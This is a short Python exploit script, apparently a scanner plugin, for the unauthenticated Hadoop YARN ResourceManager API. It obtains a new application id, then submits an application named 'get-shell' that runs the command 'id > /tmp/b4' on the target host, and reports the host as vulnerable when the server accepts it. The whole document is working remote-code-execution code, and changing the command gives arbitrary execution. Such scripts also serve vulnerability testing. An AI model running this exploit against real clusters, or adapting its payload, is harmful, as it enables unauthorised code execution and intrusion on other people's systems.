import requests
requests.packages.urllib3.disable_warnings()
def run(url):
    """Hadoop yarn unauth"""
    url1 = url+':8088/ws/v1/cluster/apps/new-application'
    req1 = requests.post(url1)

    app_id = req1.json()['application-id']
    url = url+':8088/ws/v1/cluster/apps'
    payload = {
                'application-id': app_id,
                'application-name': 'get-shell',
                'am-container-spec': {
                'commands': {
                    'command': 'id > /tmp/b4',
                    },
                },
                'application-type': 'YARN',
    }
    req = requests.post(url, json=payload, timeout=3)
    if req.status_code == 202:
        return "Hadoop yarn unauth Vulnerable"
    else:
        return False

if __name__ == '__main__':
    print(run("http://192.168.27.136"))